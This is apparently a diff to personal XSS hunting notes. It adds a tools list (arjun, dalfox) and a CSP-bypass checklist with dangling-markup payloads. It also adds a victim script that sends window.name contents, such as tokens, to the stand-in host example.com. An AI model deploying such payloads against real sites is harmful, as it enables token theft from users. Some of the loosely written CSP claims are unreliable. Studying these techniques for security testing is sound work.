@@ -7,6 +7,11 @@ XSS types
     3. DOM: search for eval
     4. Blind : XSS hunter express
 
+#### Tools
+- arjun # param finder tool
+- dalfox # install using go; xss vul finder
+  `dalfox url <domain> --timeout 50` # Update worker etc.
+  use different modes
 
 When you are seaching somewhere and if its burp then the search text added in dom by js, will not be shown
 - If website is behind Cloudflare WAF then the vulnerabilities are minimised.
@@ -310,17 +315,37 @@ TO read:
 	https://portswigger.net/web-security/dom-based
   
 
-
-
-
 # CSP
 CSP for directive with random hash that tells to execute only if the script contains that nonce.
-Also it refers to the source where js can be executed like `self`
 
-- CSP does not completly prevent XSS
-- `unsafe inline` in CSP is vulnerable
-- CSP bypass for XSS. 
-- any `unsafe` is actually unsafe
+1. Check if CSP header is present in response and hence CSP is enabled
+   - Contains more than one directive separated by `;` and 
+     - `script-src`: for script execution source
+     - `report-uri`: contains path which could depend on input and hence can be used to bypass inline script using `script-src-elem 'unsafe-inline'`
+     - any `unsafe` is actually unsafe
+   - CSP defines nonce  for each inline script
+   - CSP defines hash for outsource scripts
+2. Inspect to console window and see the warning if something is not running
+3. Find hidden parameter that are suspectible to XSS like prefilled email
+4. check the following payload
+  - `<img src='https://example.com?` sometimes blocked by CSP `base-uri: self` meaining all images are loaded relative to this one
+  - `<base target="https://example.com?` sometimes is dangling markup which sends to https://example.com with `window.name` set to the payload which contains html component which includes token
+  - `Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'`
+    `<script>alert("This will be blocked")</script>`
+    `<a href="#" onclick="alert('This will be allowed')">test</a>`
+  payload to victim
+  ```
+  <script>
+  if (window.name) {
+    new Image().src = "https://example.com?"+ encodeURIComponent(window.name)
+  }else{
+    window.location = ""# with dangling markup in url parameters
+  }
+  </script>
+  ```
+
+
+
 
 https://www.cobalt.io/blog/csp-and-bypasses
 
